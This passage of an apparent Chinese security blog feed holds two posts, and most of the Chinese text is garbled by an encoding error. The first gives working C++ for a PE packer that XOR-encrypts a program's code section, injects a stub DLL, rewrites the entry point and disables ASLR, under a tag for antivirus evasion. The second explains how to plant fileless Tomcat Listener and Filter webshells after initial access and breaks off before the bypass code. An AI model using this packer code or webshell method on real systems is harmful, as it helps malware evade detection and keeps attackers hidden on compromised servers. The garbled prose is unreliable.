è½½åŸºå€</span><br><span class="line">DWORD pfnStart;&#x2F;&#x2F;stub.dll(start)å¯¼å‡ºå‡½æ•°çš„åœ°å€</span><br><span class="line">StubConf* pStubConf;&#x2F;&#x2F;stub.dll(g_conf)å¯¼å‡ºå…¨å±€å˜é‡çš„åœ°å€</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="æ‰“å¼€PEæ–‡ä»¶"><a href="#æ‰“å¼€PEæ–‡ä»¶" class="headerlink" title="æ‰“å¼€PEæ–‡ä»¶"></a>æ‰“å¼€PEæ–‡ä»¶</h4><p>è¿™é‡Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯åˆ©ç”¨CreateFileAå‡½æ•°ã€‚åŒæ—¶è¿™ä¸ªå‡½æ•°è¿˜æŠ›å‡ºäº†ä¸€ä¸ªæŒ‡å‘PEæ–‡ä»¶å¤§å°çš„æŒ‡é’ˆ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char* GetFileHmoudle(_In_ const char* path,_Out_opt_ DWORD* nFileSize) &#123;</span><br><span class="line">&#x2F;&#x2F;æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¹¶è·å¾—æ–‡ä»¶å¥æŸ„</span><br><span class="line">HANDLE hFile &#x3D; CreateFileA(path,</span><br><span class="line">GENERIC_READ,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line">NULL,</span><br><span class="line">OPEN_ALWAYS,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">NULL);</span><br><span class="line">&#x2F;&#x2F;è·å¾—æ–‡ä»¶å¤§å°</span><br><span class="line">DWORD FileSize &#x3D; GetFileSize(hFile, NULL);</span><br><span class="line">&#x2F;&#x2F;è¿”å›æ–‡ä»¶å¤§å°åˆ°å˜é‡nFileSize</span><br><span class="line">if(nFileSize)</span><br><span class="line">*nFileSize &#x3D; FileSize;</span><br><span class="line">&#x2F;&#x2F;ç”³è¯·ä¸€ç‰‡å¤§å°ä¸ºFileSizeçš„å†…å­˜å¹¶å°†æŒ‡é’ˆç½®äºé¦–ä½</span><br><span class="line">char* pFileBuf &#x3D; new CHAR[FileSize]&#123; 0 &#125;;</span><br><span class="line">&#x2F;&#x2F;ç»™åˆšåˆšç”³è¯·çš„å†…å­˜è¯»å…¥æ•°æ®</span><br><span class="line">DWORD dwRead;</span><br><span class="line">ReadFile(hFile, pFileBuf, FileSize, &amp;dwRead, NULL);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">return pFileBuf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åŠ è½½STUB"><a href="#åŠ è½½STUB" class="headerlink" title="åŠ è½½STUB"></a>åŠ è½½STUB</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void LoadStub(_In_ StubInfo* pstub) &#123;</span><br><span class="line">pstub-&gt;dllbase &#x3D; (char*)LoadLibraryEx(L&quot;F:\\stubdll.dll&quot;, NULL, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class="line">pstub-&gt;pfnStart &#x3D; (DWORD)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;Start&quot;);  &#x2F;&#x2F;è·å¾—stubçš„å…¥å£å‡½æ•°Start(è‡ªå·±å®šä¹‰åœ¨stubä¸­çš„ä¸€ä¸ªå‡½æ•°</span><br><span class="line">pstub-&gt;pStubConf &#x3D; (StubConf*)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;g_conf&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;ä¸ä»…åŠ è½½äº†stubï¼Œè¿˜è·å¾—äº†stubæŠ›å‡ºçš„ç”¨äºæ”¶é›†ä¿¡æ¯çš„å…¨å±€ç»“æ„ä½“ï¼ˆg_conf,æ˜¯ä¸€ä¸ªstubæŠ›å‡ºçš„ç»“æ„ä½“ï¼Œç”¨äºè·å–ä¿¡æ¯ï¼Œç»“æ„å¦‚ä¸‹ï¼‰</span><br><span class="line">typedef struct _StubConf</span><br><span class="line">&#123;</span><br><span class="line">DWORD srcOep;&#x2F;&#x2F;å…¥å£ç‚¹</span><br><span class="line">DWORD textScnRVA;&#x2F;&#x2F;ä»£ç æ®µRVA</span><br><span class="line">DWORD textScnSize;&#x2F;&#x2F;ä»£ç æ®µçš„å¤§å°</span><br><span class="line">DWORD key;&#x2F;&#x2F;è§£å¯†å¯†é’¥</span><br><span class="line">&#125;StubConf;</span><br></pre></td></tr></table></figure><h4 id="åŠ å¯†ä»£ç æ®µ"><a href="#åŠ å¯†ä»£ç æ®µ" class="headerlink" title="åŠ å¯†ä»£ç æ®µ"></a>åŠ å¯†ä»£ç æ®µ</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD textRVA &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;VirtualAddress;</span><br><span class="line">DWORD textSize &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;Misc.VirtualSize;</span><br><span class="line">Encry(PeHmoudle,pstub);</span><br><span class="line">void Encry(_In_ char* hpe,_In_ StubInfo pstub) &#123;</span><br><span class="line">&#x2F;&#x2F;è·å–ä»£ç æ®µé¦–åœ°å€</span><br><span class="line">BYTE* TargetText &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;PointerToRawData + (BYTE*)hpe;</span><br><span class="line">&#x2F;&#x2F;è·å–ä»£ç æ®µå¤§å°</span><br><span class="line">DWORD TargetTextSize &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;Misc.VirtualSize;</span><br><span class="line">&#x2F;&#x2F;åŠ å¯†ä»£ç æ®µ</span><br><span class="line">for (int i &#x3D; 0; i &lt; TargetTextSize; i++) &#123;</span><br><span class="line">TargetText[i] ^&#x3D; 0x15;</span><br><span class="line">&#125;</span><br><span class="line">pstub.pStubConf-&gt;textScnRVA &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;VirtualAddress;</span><br><span class="line">pstub.pStubConf-&gt;textScnSize &#x3D; TargetTextSize;</span><br><span class="line">pstub.pStubConf-&gt;key &#x3D; 0x15;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;åŠ å¯†ä»£ç æ®µï¼Œå¹¶ç»™äºˆäº†stubä¸€äº›ä¿¡æ¯</span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ æ–°åŒºæ®µ"><a href="#æ·»åŠ æ–°åŒºæ®µ" class="headerlink" title="æ·»åŠ æ–°åŒºæ®µ"></a>æ·»åŠ æ–°åŒºæ®µ</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char* AddSec(_In_ char*&amp; hpe, _In_ DWORD&amp; filesize, _In_ const char* secname, _In_ const int secsize) &#123;</span><br><span class="line">GetFileHeader(hpe)-&gt;NumberOfSections++;</span><br><span class="line">PIMAGE_SECTION_HEADER pesec &#x3D; GetLastSec(hpe);</span><br><span class="line">&#x2F;&#x2F;è®¾ç½®åŒºæ®µè¡¨å±æ€§</span><br><span class="line">memcpy(pesec-&gt;Name, secname, 8);</span><br><span class="line">pesec-&gt;Misc.VirtualSize &#x3D; secsize;</span><br><span class="line">pesec-&gt;VirtualAddress &#x3D; (pesec - 1)-&gt;VirtualAddress + AlignMent((pesec - 1)-&gt;SizeOfRawData,GetOptHeader(hpe)-&gt;SectionAlignment);</span><br><span class="line">pesec-&gt;SizeOfRawData &#x3D; AlignMent(secsize, GetOptHeader(hpe)-&gt;FileAlignment);</span><br><span class="line">pesec-&gt;PointerToRawData &#x3D; AlignMent(filesize,GetOptHeader(hpe)-&gt;FileAlignment);</span><br><span class="line">pesec-&gt;Characteristics &#x3D; 0xE00000E0;</span><br><span class="line">&#x2F;&#x2F;è®¾ç½®OPTå¤´æ˜ åƒå¤§å°</span><br><span class="line">GetOptHeader(hpe)-&gt;SizeOfImage &#x3D; pesec-&gt;VirtualAddress + pesec-&gt;SizeOfRawData;</span><br><span class="line">&#x2F;&#x2F;æ‰©å……æ–‡ä»¶æ•°æ®</span><br><span class="line">int newSize &#x3D; pesec-&gt;PointerToRawData + pesec-&gt;SizeOfRawData;</span><br><span class="line">char* nhpe &#x3D; new char [newSize] &#123;0&#125;;</span><br><span class="line">&#x2F;&#x2F;å‘æ–°ç¼“å†²åŒºå½•å…¥æ•°æ®</span><br><span class="line">memcpy(nhpe, hpe, filesize);</span><br><span class="line">&#x2F;&#x2F;ç¼“å­˜åŒºæ›´æ›¿</span><br><span class="line">delete hpe;</span><br><span class="line">filesize &#x3D; newSize;</span><br><span class="line">return nhpe;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stubé‡å®šä½"><a href="#stubé‡å®šä½" class="headerlink" title="stubé‡å®šä½"></a>stubé‡å®šä½</h4><p>å¥½å®¶ä¼™ï¼Œè¿™ä¸ªä¸œè¥¿ç¨æœ‰ä¸æ…å°±ä¼šè®©æ•´ä¸ªç¨‹åºæ‹‰è·¨æ‰ï¼ˆè¿‡æ¥äººçš„å¿ å‘Š<br>ä¸ºä»€ä¹ˆéœ€è¦stubé‡å®šä½å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬çš„stubæœ€å¼€å§‹æ˜¯åŠ è½½åœ¨å†…å­˜ä¸­çš„ï¼Œå®ƒçš„è®¸å¤šæŒ‡ä»¤å¦‚è·³è½¬åˆ°çš„åœ°å€æ˜¯æŒ‰å†…å­˜ä¸ºåŸºå‡†ç¡®å®šçš„ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æŠŠä»–ç§»æ¤è¿›æ–‡ä»¶ï¼Œæ‰€ä»¥å®ƒçš„ä»£ç é‡Œè®¸å¤šåœ°å€å°±æ˜¯é”™è¯¯çš„ï¼Œæˆ‘ä»¬éœ€è¦å¯¹è¿™äº›åœ°å€è¿›è¡Œå¤„ç†ï¼Œå³é‡å®šä½ï¼Œä½¿å…¶ä»¥å®¿ä¸»ç¨‹åºä¸ºæ ‡å‡†è¿›è¡Œåœ°å€ä¿®å¤ã€‚<br>å¯èƒ½æˆ‘è¡¨è¿°çš„ä¸æ˜¯å¾ˆæ¸…æ¥šğŸ˜¥ä¸¾ä¸ªä¾‹å­å§ï¼Œæ¯”å¦‚stubåœ¨åŠ è½½è¿›å†…å­˜æ—¶ï¼Œæœ‰ä¸€æ¡è·³è½¬æŒ‡ä»¤æ—¶jmp 12345678, å¦‚æœæˆ‘ä»¬ä¸å¤„ç†å°±æŠŠè¿™æ¡æŒ‡ä»¤ç§»æ¤è¿›PEæ–‡ä»¶ï¼Œé‚£ä¹ˆPEæ–‡ä»¶æ‰§è¡Œåˆ°æ­¤å¤„æ—¶å°±ä¼šè·³è½¬åˆ°12345678ï¼Œæ­¤æ—¶çš„12345678åœ°å€å¯èƒ½å°±å·²ç»ä¸æ˜¯PEæ–‡ä»¶åŠ è½½çš„å†…å­˜åŒºé—´äº†ï¼Œä»è€Œç¨‹åºä¼šå´©æºƒã€‚æ‰€ä»¥è¦ä¿®å¤ã€‚æ ¹æ®stubçš„é‡å®šä½è¡¨è¿›è¡Œä¿®å¤ã€‚<br>é‡å®šä½è¡¨å°±æ˜¯è®°å½•å“ªäº›åœ°å€çš„æ•°æ®éœ€è¦è¢«ä¿®å¤çš„ï¼Œæˆ‘ä»¬éå†è¿™äº›åœ°å€è¿›è¡Œä¿®å¤å³å¯ã€‚<br>å¦‚æœä»¥ä¸‹ä»£ç çœ‹èµ·æ¥åƒåŠ›ï¼Œå¯ä»¥å…ˆå»äº†è§£ä¸€ä¸‹é‡å®šä½è¡¨</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void FixStub(DWORD targetDllbase, DWORD stubDllbase,DWORD targetNewScnRva,DWORD stubTextRva )</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;æ‰¾åˆ°stub.dllçš„é‡å®šä½è¡¨</span><br><span class="line">DWORD dwRelRva &#x3D; GetOptHeader((char*)stubDllbase)-&gt;DataDirectory[5].VirtualAddress;</span><br><span class="line">IMAGE_BASE_RELOCATION* pRel &#x3D; (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;éå†é‡å®šä½è¡¨</span><br><span class="line">while (pRel-&gt;SizeOfBlock)</span><br><span class="line">&#123;</span><br><span class="line">struct TypeOffset</span><br><span class="line">&#123;</span><br><span class="line">WORD offset : 12;</span><br><span class="line">WORD type : 4;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">TypeOffset* pTypeOffset &#x3D; (TypeOffset*)(pRel + 1);</span><br><span class="line">DWORD dwCount &#x3D; (pRel-&gt;SizeOfBlock - 8) &#x2F; 2;&#x2F;&#x2F;éœ€è¦é‡å®šä½çš„æ•°é‡</span><br><span class="line">for (int i &#x3D; 0; i &lt; dwCount; i++)</span><br><span class="line">&#123;</span><br><span class="line">if (pTypeOffset[i].type !&#x3D; 3)</span><br><span class="line">&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;éœ€è¦é‡å®šä½çš„åœ°å€</span><br><span class="line">DWORD* pFixAddr &#x3D; (DWORD*)(pRel-&gt;VirtualAddress + pTypeOffset[i].offset + stubDllbase);</span><br><span class="line"></span><br><span class="line">DWORD dwOld;</span><br><span class="line">&#x2F;&#x2F;ä¿®æ”¹å±æ€§ä¸ºå¯å†™</span><br><span class="line">VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">&#x2F;&#x2F;å»æ‰dllå½“å‰åŠ è½½åŸºå€</span><br><span class="line">*pFixAddr -&#x3D; stubDllbase;</span><br><span class="line">&#x2F;&#x2F;å»æ‰é»˜è®¤çš„æ®µé¦–RVA</span><br><span class="line">*pFixAddr -&#x3D; stubTextRva;</span><br><span class="line">&#x2F;&#x2F;æ¢ä¸Šç›®æ ‡æ–‡ä»¶çš„åŠ è½½åŸºå€</span><br><span class="line">*pFixAddr +&#x3D; targetDllbase;</span><br><span class="line">&#x2F;&#x2F;åŠ ä¸Šæ–°åŒºæ®µçš„æ®µé¦–RVA</span><br><span class="line">*pFixAddr +&#x3D; targetNewScnRva;</span><br><span class="line">&#x2F;&#x2F;æŠŠå±æ€§ä¿®æ”¹å›å»</span><br><span class="line">VirtualProtect(pFixAddr, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªé‡å®šä½å—</span><br><span class="line">pRel &#x3D; (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stubç§»æ¤"><a href="#stubç§»æ¤" class="headerlink" title="stubç§»æ¤"></a>stubç§»æ¤</h4><p>è¿™ä¸ªç®€å•ï¼Œæ²¡å•¥è¯´çš„</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memcpy(GetLastSec(PeNewHmoudle)-&gt;PointerToRawData+ PeNewHmoudle,</span><br><span class="line">GetSecByName(pstub.dllbase, &quot;.text&quot;)-&gt;VirtualAddress+pstub.dllbase,</span><br><span class="line">GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;Misc.VirtualSize);</span><br></pre></td></tr></table></figure><h4 id="å…¥å£ç‚¹ä¿®æ”¹"><a href="#å…¥å£ç‚¹ä¿®æ”¹" class="headerlink" title="å…¥å£ç‚¹ä¿®æ”¹"></a>å…¥å£ç‚¹ä¿®æ”¹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GetOptHeader(PeNewHmoudle)-&gt;AddressOfEntryPoint &#x3D;</span><br><span class="line">pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;VirtualAddress+GetLastSec(PeNewHmoudle)-&gt;VirtualAddress;</span><br></pre></td></tr></table></figure><h4 id="å»éšæœºåŸºå€"><a href="#å»éšæœºåŸºå€" class="headerlink" title="å»éšæœºåŸºå€"></a>å»éšæœºåŸºå€</h4><p>ä¸å»æ‰éšæœºåŸºå€ï¼ŒåŠ è½½åŸºå€å°±æ˜¯ä¸å›ºå®šçš„ï¼Œä¸æ–¹ä¾¿æ“ä½œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GetOptHeader(PeNewHmoudle)-&gt;DllCharacteristics &amp;&#x3D; (~0x40);</span><br></pre></td></tr></table></figure><h4 id="ä¿å­˜æ–‡ä»¶"><a href="#ä¿å­˜æ–‡ä»¶" class="headerlink" title="ä¿å­˜æ–‡ä»¶"></a>ä¿å­˜æ–‡ä»¶</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) &#123;</span><br><span class="line">HANDLE hFile &#x3D; CreateFileA(</span><br><span class="line">path,</span><br><span class="line">GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line">NULL,</span><br><span class="line">CREATE_ALWAYS,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">NULL</span><br><span class="line">);</span><br><span class="line">DWORD Buf &#x3D; 0;</span><br><span class="line">WriteFile(hFile, data, FileSize, &amp;Buf,NULL);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ç¬¬ä¸€æ¬¡æåº•å±‚çš„ç©æ„å„¿ï¼Œå¯¼è‡´è°ƒè¯•è¿™ä¸œè¥¿èŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ã€‚ã€‚<br>ä¸è¿‡å­¦çš„è¿˜æ˜¯ï¼Ÿè›®å¤šçš„ï¼Ÿ<br>åŠ¨æ€è°ƒè¯•ï¼Œc++ï¼Œæ±‡ç¼–ï¼ŒPEç»“æ„ï¼ŒåŠ¨æ€å¯»å€éƒ½å­¦åˆ°äº†äº›ã€‚ï¼ˆæ€ä¹ˆæ„Ÿè§‰åœ¨å¾€é€†å‘èµ°äº†2333<br>ç»§ç»­å¼„å§ï¼Œè¿™ä¸ªé¡¹ç›®ç›®å‰è¿˜æœ‰bugï¼Œç­‰ä»¥åæ¥äº†å…´è¶£å†ç»§ç»­æ·»åŠ æ›´å¤šæ›´ç‰›é€¼çš„æœºåˆ¶ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒ:&lt;a href=&quot;https://blog.csdn.net/qq_31507523/article/details/89438410&quot;&gt;https://blog.csdn.net/qq_31507523/article/details/89438410&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    
    <category term="ç³»ç»Ÿç›¸å…³ä¸å…æ€" scheme="http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>tomcat Listenerï¼ŒFilterå†…å­˜é©¬ç®€è¦åˆ†æ</title>
    <link href="http://const27.com/2021/06/28/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"/>
    <id>http://const27.com/2021/06/28/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/</id>
    <published>2021-06-28T13:51:11.051Z</published>
    <updated>2021-06-27T04:44:52.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tomcatå†…å­˜é©¬"><a href="#tomcatå†…å­˜é©¬" class="headerlink" title="tomcatå†…å­˜é©¬"></a>tomcatå†…å­˜é©¬</h1><h2 id="tomcat-å®¹å™¨"><a href="#tomcat-å®¹å™¨" class="headerlink" title="tomcat å®¹å™¨"></a>tomcat å®¹å™¨</h2><p>tomcat ä¸»è¦åŒ…å«å››ç§å®¹å™¨ï¼šEngineï¼ŒHostï¼ŒContextï¼ŒWrapperã€‚å…¶å¯¹åº”å…³ç³»å¦‚ä¸‹å›¾</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210406203203615.png" alt="image-20210406203203615"></p><p>è¯¦ç»†è§£è¯»ä¸€ä¸‹è¿™ä¸ªå›¾ã€‚</p><p>ä¸€å°æœåŠ¡å™¨ä¸Šæ˜¯å¯ä»¥é…ç½®å¤šä¸ªç«™ç‚¹çš„ï¼Œå¯¹äºtomcatæ¥è¯´ï¼Œæ¯ä¸€ä¸ªç«™ç‚¹å°±å¯¹åº”ä¸€ä¸ªHOSTã€‚</p><p>ä¸€ä¸ªç«™ç‚¹ä¸Šæ˜¯å¯ä»¥é…ç½®å¤šä¸ªWEBåº”ç”¨çš„ï¼Œæ¯”å¦‚è¯´ä¸€ä¸ªç«™ç‚¹å¯èƒ½ä¼šæœ‰OAï¼ŒSSOï¼Œé‚®ä»¶åº”ç”¨ç­‰ç­‰WEBåº”ç”¨ï¼Œå¯¹äºtomcatæ¥è¯´æ¯ä¸€ä¸ªWEBåº”ç”¨ä¾¿å¯¹åº”ç€ä¸€ä¸ªContextã€‚</p><p>ä¸€ä¸ªWEBåº”ç”¨ä¸­è‚¯å®šä¹Ÿæœ‰å¤šä¸ªè®¿é—®è·¯å¾„ï¼Œæ¯”å¦‚è¯´OAå¯èƒ½å°±æœ‰ç™»å½•ï¼Œå‰ç«¯å±•ç¤ºï¼Œæœç´¢ç­‰ã€‚æ‰€ä»¥å¯¹äºæ¯ä¸€ä¸ªè®¿é—®è·¯å¾„tomcatéƒ½ä¼šåˆ†é…ä¸€ä¸ªWrapperï¼Œæ¯ä¸€ä¸ªWrapperå¯¹åº”ä¸€ä¸ªServletï¼Œç”¨äºå¤„ç†ç‰¹å®šè¯·æ±‚ã€‚</p><h2 id="Listener-å†…å­˜é©¬"><a href="#Listener-å†…å­˜é©¬" class="headerlink" title="Listener å†…å­˜é©¬"></a>Listener å†…å­˜é©¬</h2><p>tomcatæ”¶åˆ°è¯·æ±‚æ—¶ï¼Œå¤„ç†é¡ºåºæ˜¯ Listener-&gt;Filter-&gt;Servletã€‚<br>ä¹Ÿå°±æ˜¯è¯´Listeneræ˜¯æœ€å…ˆæ¥è§¦åˆ°æ•°æ®è¯·æ±‚çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨Listenerä¸Šåšæ‰‹è„šä»è€Œè¾¾åˆ°å†…å­˜é©¬çš„ç›®çš„ã€‚</p><p>å®é™…ä¸Šï¼Œæˆ‘ä»¬æƒ³å®ç°ä¸€ä¸ªå†…å­˜é©¬ï¼Œæ€è·¯ä¾¿æ˜¯æƒ³è®©tomcatæ‰§è¡Œä¸€æ®µæ¶æ„ç¨‹åºï¼ŒæŠŠæ¶æ„çš„listeneræˆ–è€…filterç±»å†™å…¥tomcatå†…å­˜ä¸­ï¼Œç”±äºtomcatå¤„ç†è¯·æ±‚æ—¶ï¼Œè¯·æ±‚ä¼šè¢«listenerå’Œfilterå¤„ç†ï¼ˆä¹Ÿå°±æ˜¯è¯´ä¼šè¢«æˆ‘ä»¬çš„æ¶æ„ç±»å¤„ç†ï¼‰ï¼Œå› æ­¤è¾¾åˆ°éšè”½çš„æœ¨é©¬åŠŸèƒ½ã€‚</p><p>å…·ä½“æ€ä¹ˆä¸ªå®ç°å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥å¤§è‡´æƒ³è±¡ä¸€ä¸ªæ€è·¯ï¼šè·å–æœåŠ¡å™¨åˆæ­¥æƒé™åï¼Œåˆ›å»ºä¸€ä¸ªJSPå¹¶å‘å†…å†™å…¥å‘å†…å­˜æ³¨å…¥æ¶æ„Listeneræˆ–filterçš„ä»£ç ï¼Œéšåè®¿é—®JSPè§¦å‘JSPä»£ç ï¼Œæ¶æ„Listeneræˆ–filterè¢«æ³¨å…¥å†…å­˜ï¼Œéšååˆ é™¤JSPï¼Œé€šè¿‡æ¶æ„Listeneræˆ–filterå®ç°æ— æ–‡ä»¶webshellã€‚ä½†æ˜¯ç”±äºä¸€äº›åŸå› å¯¼è‡´ç›´æ¥é€šè¿‡addListeneræˆ–è€…addFilteræ¥æ·»åŠ ç›‘å¬å™¨æˆ–è¿‡æ»¤å™¨ä¼šæŠ¥é”™ï¼Œå…·ä½“è§£å†³æ–¹æ³•å°±æ˜¯ä¸‹æ–‡çš„å†…å®¹äº†ï¼š</p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>å¦‚æœæˆ‘ä»¬æƒ³æ·»åŠ ä¸€ä¸ªListenerï¼Œé‚£ä¹ˆåŠ¿å¿…ä¼šç”¨åˆ°ä¸€ä¸ªæ–¹æ³•ï¼šaddListenerã€‚</p><p>æˆ‘ä»¬æ¥åˆ†æä»¥ä¸‹è¿™ä¸ªæ–¹æ³•ï¼Œæƒ³åŠæ³•é€šè¿‡addListeneræ–¹æ³•æŠŠæ¶æ„Listeneræ³¨å…¥å†…å­˜ã€‚<br>é¦–å…ˆaddListeneræ–¹æ³•æ˜¯è¿™ä¹ˆç”¨çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();</span><br><span class="line">servletContext.addListener(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç›´æ¥è·Ÿè¿›addListenerï¼Œä¼šå‘ç°è·Ÿè¿›åˆ°äº†ServletContextè¿™ä¸ªæ¥å£ç±»ã€‚</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20210626150246949.png" alt="image-20210626150246949"></p><p>é‚£ä¹ˆå®ç°addListenerçš„ç±»æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ¢å¥è¯è¯´ï¼ŒservletContextè¿™ä¸ªå®ä¾‹åŒ–å¯¹è±¡æ˜¯å¦‚ä½•è¢«å®ä¾‹åŒ–çš„å‘¢ï¼Ÿ</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626150652699.png" alt="image-20210626150652699"></p><p>é€šè¿‡è°ƒè¯•ï¼Œæˆ‘ä»¬å‘ç°servletContextè¿™ä¸ªå¯¹è±¡å®é™…ä¸Šæ˜¯ä¸€ä¸ªApplicationContextFacadeå¯¹è±¡ã€‚<br>æˆ‘ä»¬è·Ÿè¿›åˆ°ApplicationContextFacade.classä¸­ï¼ŒæŸ¥çœ‹addListeneræ–¹æ³•çš„å®ç°ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626151054515.png" alt="image-20210626151054515"></p><p>å‘ç°å®é™…ä¸Šæ˜¯è°ƒç”¨äº†ApplicationContextç±»çš„addListeneræ–¹æ³•ã€‚å†æ¬¡è·Ÿè¿›ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626153212402.png" alt="image-20210626153212402"></p><p>è¿™é‡Œè¿˜è°ƒç”¨äº†ä¸€ä¸ªaddListenerï¼Œå†æ¬¡è·Ÿè¿›ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154012832.png" alt="image-20210626154012832"></p><p>è¿™é‡Œå€Ÿç”¨çš„åˆ«äººçš„å›¾ï¼Œå¯ä»¥å‘ç°å¦‚æœæœåŠ¡å™¨å·²å¯åŠ¨ï¼Œé‚£ä¹ˆé€šè¿‡ç›´æ¥è°ƒç”¨addListeneræ˜¯æ— æ³•æ·»åŠ ç›‘å¬å™¨çš„ã€‚</p><p>ç©¶å…¶åŸå› ï¼Œä¾¿æ˜¯æ­¤å¤„çš„contextæ˜¯StandardContextï¼Œå®ƒçš„çŠ¶æ€æ˜¯å¼€å§‹çŠ¶æ€ï¼Œæ— æ³•åœ¨ifåˆ¤æ–­ä¸­è¿”å›trueã€‚<br>è¿™ä¹Ÿå°±æ˜¯ä¸Šæ–‡æåˆ°çš„  â€œä½†æ˜¯ç”±äºä¸€äº›åŸå› å¯¼è‡´ç›´æ¥é€šè¿‡addListeneræˆ–è€…addFilteræ¥æ·»åŠ ç›‘å¬å™¨æˆ–è¿‡æ»¤å™¨ä¼šæŠ¥é”™â€</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154229868.png" alt="image-20210626154229868"></p><p>å¦‚æœèƒ½å¤Ÿçªç ´ifåˆ¤æ–­ï¼Œæ¥åˆ°æ­¤å¤„ï¼Œé‚£ä¹ˆç›‘å¬å™¨å°±ä¼šè¢«é¡ºåˆ©çš„æ·»åŠ ä¸Š</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626155428011.png" alt="image-20210626155428011"></p><h3 id="ç¼–å†™Listenerå†…å­˜é©¬"><a href="#ç¼–å†™Listenerå†…å­˜é©¬" class="headerlink" title="ç¼–å†™Listenerå†…å­˜é©¬"></a>ç¼–å†™Listenerå†…å­˜é©¬</h3><p>æ—¢ç„¶é˜»ç¢æˆ‘ä»¬æ·»åŠ Listenerçš„åŸå› å·²ç»æ‰¾åˆ°äº†ï¼Œé‚£ä¹ˆå°±åº”è¯¥è€ƒè™‘å¦‚ä½•ç»•è¿‡è¿™ä¸ªé™åˆ¶äº†ã€‚<br>å¾ˆç®€å•ï¼Œé€šè¿‡åå°„å³å¯ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚</p><p>åœ¨ç¼–å†™åå°„ä»£ç 